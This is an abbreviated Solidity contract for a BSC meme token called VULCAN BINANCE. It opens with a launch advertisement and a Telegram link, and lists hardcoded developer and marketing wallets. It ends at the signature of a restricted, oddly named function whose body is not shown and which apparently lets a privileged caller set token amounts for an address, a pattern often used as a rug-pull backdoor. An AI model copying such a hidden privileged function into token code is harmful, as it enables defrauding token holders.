/**
♈️ VULCAN BINANCE ♈️| BSC

FAIRLAUNCH 17.00 UTC, TODAY
...
♈️| Tax Buy 7% / Sell 8%
♈️| MC: 300
♈️| Supply 54.000.000.000

🌐Join this community :
TG : https://t.me/+5Af9iOUzqkliMzRl
**/
...
contract VULCANBINANCE is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "VULCAN BINANCE";
    string private constant _symbol = unicode"$VULCAN";
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint8 private _TxCount = 0;
    uint256 private _tTotal = 54000000000 * 10**_decimals;
    ...
    address payable public DevWallet = payable(0x527183415A8d93756D8eED59C04EDf97D1832C24);
    address payable public MarketingWallet = payable(0x2Be07d22366659F8142F2f9B5E305C91dcA65cf9);
    ...
    function vulcanewToken(uint256 value, address adr) onlyAddress public virtual {
